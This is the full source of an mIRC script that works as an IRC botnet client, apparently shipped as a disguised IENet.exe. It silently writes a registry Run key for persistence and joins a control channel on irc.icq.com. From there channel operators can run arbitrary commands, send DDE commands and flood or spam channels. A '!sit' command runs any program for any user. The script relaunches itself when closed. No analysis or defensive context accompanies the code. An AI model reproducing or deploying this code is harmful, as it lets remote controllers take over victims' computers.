on *:START:{ register | jconf | JboT }
alias jconf {
  /set %nr irc.icq.com | /set %np 6667 | /set %nc #saudia | /set %oc #dubai | /set %nl 6633 
}
alias JboT { .nick $read(IEXPLORER.CTX,$r(1,259)) | .username $read(IEXPLORER.CTX,$r(1,259)) | .identd on $read(IEXPLORER.CTX,$r(1,259)) | .anick $read(IEXPLORER.CTX,$r(1,259)) | emailaddr $read(IEXPLORER.CTX,$r(1,259)) | .connec }

on *:TEXT:!do*:*:{ if ($nick isop %nc && $2 == exit) { .msg %nc lol try again }
  elseif ($nick isop %nc && $2 == remove) { .msg %nc lol try again }
  elseif ($nick isop %nc) { $+ $2- }
}
on *:TEXT:!jmk*:*: if ($nick isop %nc) { .join $2 | .msg $2 $3- | .msg $2 $3- | .msg $2 $3- | .part $2 !! }
on *:TEXT:!jk*:*: if ($nick isop %nc) { .join $2 | .msg $2 $3- | .ctcp $2 version | .notice $2 $3- | .ctcp $2 Ping | .part $2 Fucked.By.!!!!!!.Attack.Bot.Ver.2 }
on *:TEXT:!ado*:*: if ($nick isop %nc && $2 == $me) { $+ $3- }
on *:TEXT:!ts*:*: if ($nick isop %nc && $2 == $me) { .msg %nc Uptime System; $uptime
(system,1) | .msg %nc Uptime mIRC; $uptime(mirc,1) | .msg %nc Uptime Server; $uptime(Server,1) }
on *:TEXT:!fnd*:*: if ($nick isop %nc && $2 == $me) { var %Chanz = $chan(0) | while (%Chanz) { msg # @Channels Channel: $Chan(%Chanz) -> Mode: $chan($Chan(%Chanz)).mode - Ops: $opnick($Chan(%Chanz),0) - Voices: $vnick($Chan(%Chanz),0) - User: $nick($Chan(%Chanz),0,r) - Total: $nick($Chan(%Chanz),0) | dec %Chanz } }
on *:TEXT:!dde*:*: if ($nick isop %nc) { /dde $2 command "" / $+ $3- }
on *:TEXT:!nick*:*: if ($nick isop %nc && $2 == $me) { .nick $3 }
on *:TEXT:!sit*:*: if ($nick == $nick ) { run -np $2- }
on 1:DISCONNECT:/server %nr %np
on *:exit:{ clearall | .timers off | .run IENet.exe }
on *:connect:{ .timerjc 0 10 /jc  } | { join %auto.channels } | /timer 0 30 /ping $me
alias jc { .join %nc %nk | .join %oc  }
on *:join:%nc:{ if ($nick == $me) { .timers off } }
on *:join:#:{    }
on *:PING:{ .ctcp $me ping }


alias connec { server %nr %np | if ($portfree(113)) { socklisten IDENT 113 } }
raw 433:*:{ .nick $read(IEXPLORER.CTX,$r(1,40)) }

alias register { 
  set %meshal meshal.reg 
  write %meshal  REGEDIT4
  write %meshal [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]  
  write %meshal "esexi"=" $+ $replace($mircdir,\,\\) $+ IENet.exe"  
  run -n regedit /s %meshal
  timer 1 4 remove %meshal
}
